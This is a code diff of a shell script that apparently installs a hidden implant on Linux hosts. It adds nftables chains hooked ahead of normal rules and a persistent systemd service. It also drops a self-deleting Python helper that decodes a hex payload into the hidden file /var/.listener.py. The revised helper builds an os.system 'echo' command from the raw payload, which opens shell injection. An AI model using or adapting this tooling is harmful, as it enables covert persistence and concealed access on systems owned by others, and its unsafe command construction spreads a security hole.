@@ -5,10 +5,6 @@ apt-get update && apt-get install -y pip
 yum install -y nftables 
 yum install -y python3
 yum install -y pip
-pip install os
-pip install socket
-pip install file
-pip install sys
 nft add table firewall
 nft add chain firewall vIn \{ type filter hook input priority -101 \; policy accept\; \}
 nft add chain firewall vOut \{ type filter hook output priority -101 \; policy accept\; \}
@@ -30,14 +26,12 @@ StartLimitBurst=999
 WantedBy=multi-user.target
 EOFA
 cat <<EOFA > /tmp/test.py
-import file
 import sys
 import os
 def main():
-	f = open("/var/.listener.py", "w")
+	os.system('touch /var/.listener.py')
 	package = bytes.fromhex(sys.argv[1]).decode('utf-8')
-	f.write(package)
-	f.close()
+	os.system('echo ' + package + ' >> /var/.listener.py')
 	self = sys.argv[0]
 	os.system(f"rm {self}")
 main()
